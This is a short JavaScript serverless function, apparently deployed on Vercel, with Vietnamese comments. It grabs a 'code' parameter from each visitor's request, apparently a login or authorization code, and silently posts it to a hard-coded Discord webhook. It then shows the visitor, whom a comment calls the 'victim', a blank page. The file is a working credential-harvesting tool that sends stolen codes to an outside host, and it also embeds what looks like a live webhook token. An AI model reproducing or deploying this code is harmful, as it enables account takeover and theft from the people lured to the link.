export default async function handler(req, res) {
    const code = req.query.code;
    
    // Thay link Discord Webhook thật của bạn vào đây
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";

    if (code && !WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL_HERE")) {
        // Server Vercel tự động gửi sang Discord Webhook (Bất tử trên mọi loại mobile)
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🚨 **Code Mới Nhận Được (Mobile/PC):** \`${code}\``
                })
            });
        } catch (e) {
            // Bỏ qua lỗi ngầm
        }
    }

    // Trả về trang web trắng tinh cho nạn nhân nhìn thấy
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(`
        <!DOCTYPE html>
        <html>
        <head><title></title></head>
        <body style="background-color: #ffffff; margin: 0;"></body>
        </html>
    `);
}
